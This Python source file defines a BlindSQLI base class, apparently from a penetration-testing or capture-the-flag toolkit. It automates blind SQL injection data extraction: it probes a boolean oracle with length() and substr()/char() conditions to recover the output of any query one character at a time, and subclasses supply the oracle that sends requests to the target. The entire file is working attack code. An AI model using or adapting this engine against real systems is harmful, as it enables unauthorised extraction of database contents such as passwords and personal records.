# coding: utf-8

import string
import logging

class QueryError(Exception):
    pass

class BlindSQLI(object):
    CHARSET = string.printable

    def __init__(self, logger=logging.getLogger("BlindSQLI")):
        self._logger = logger

    def _getDataLength(self, query):
        self._logger.info("Retreiving data length")
        CONDITION = "length({query})<={length}"

        length = 0
        while not self.check(CONDITION.format(query=query, length=length)):
            self._logger.debug("length = {}".format(length))
            length += 1

        self._logger.info("Data length is {}".format(length))
        return length

    def getQueryResult(self, query):
        CONDITION = "substr({query}, {offset}, 1)=char({character})"

        data = ""
        for offset in range(self._getDataLength(query)):
            found = False

            for character in self.CHARSET:
                self._logger.debug("Testing {} offset {}".format(character,
                                                                 offset))
                condition = CONDITION.format(query=query, offset=offset + 1,
                                             character=ord(character))
                if self.check(condition):
                    found = True
                    data += character
                    self._logger.info("Data is '{}'".format(data))
                    break

            if not found:
                raise QueryError("Character not found at "
                                 "offset {}".format(offset))
        return data

    # To be implemented by children
    def check(self, condition):
        raise NotImplementedError()
